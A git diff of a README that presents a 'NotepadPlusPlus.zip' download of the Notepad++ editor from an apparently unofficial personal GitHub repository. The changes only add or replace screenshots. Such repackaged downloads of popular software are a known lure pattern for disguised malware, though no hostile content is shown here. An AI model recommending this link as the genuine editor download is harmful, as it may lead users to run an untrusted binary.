@@ -1,13 +1,15 @@
+<img width="739" height="415" alt="image" src="https://github.com/user-attachments/assets/edc59ebf-02b5-4f18-a3da-dae2d8861c8f" />
+
 # Notepad++
 
 **Notepad++** is a free source code editor and Notepad replacement that supports several programming languages and offers a wide range of features for developers and power users.
 
-<img width="100" height="102" alt="Logo" src="https://github.com/user-attachments/assets/e135adcf-5b36-4a03-bc4d-d2426b4c754b" />
+<img width="448" height="448" alt="image" src="https://github.com/user-attachments/assets/d1e153f4-59d2-4d61-86cc-17213e3656a1" />
 
 ## Install
 [Download `NotepadPlusPlus.zip`](https://github.com/artinkavousi/notepadplusplus/releases/latest/download/NotepadPlusPlus.zip)
 ---
-<img width="1080" height="607" alt="Interface" src="https://github.com/user-attachments/assets/1cc61537-93e5-411d-8803-eb2859bb3cc2" />
+<img width="1200" height="700" alt="image" src="https://github.com/user-attachments/assets/c9fdff33-6e7f-4d94-a899-74762c37eecb" />
 
 ---
 ## Key Features
@@ -17,6 +19,12 @@
 - Plugin support for extended functionality
 - Search and replace with regular expressions
 - Lightweight and fast performance
+
+
+
+<img width="2022" height="1543" alt="image" src="https://github.com/user-attachments/assets/f56ce29d-712b-46fc-bf9b-62eb993f889b" />
+<img width="461" height="433" alt="image" src="https://github.com/user-attachments/assets/a1d8b8c9-7e88-4c18-ba13-b76857ed08da" />
+<img width="299" height="168" alt="image" src="https://github.com/user-attachments/assets/0189fe8d-832c-4f77-aeae-66b760e88eaa" />
 
 ## Getting Started
 1. **Download** the latest version using the button above.
@@ -30,6 +38,8 @@
 ## System Requirements
 - **Windows 7 / 8 / 10 / 11** (64-bit recommended)
 - Minimal system resources required
+
+<img width="700" height="427" alt="image" src="https://github.com/user-attachments/assets/0a9d18bc-70b0-4bae-918e-8fde9719e1d5" />
 
 ---
 ## Security & Legal
@@ -59,3 +69,6 @@ See [LICENSE](LICENSE) for details.
 <p align="center">
   Developed with ❤️ for developers and power users
 </p>
+
+<img width="747" height="411" alt="image" src="https://github.com/user-attachments/assets/275b8284-346b-49e5-bde8-3bff557229c7" />
+
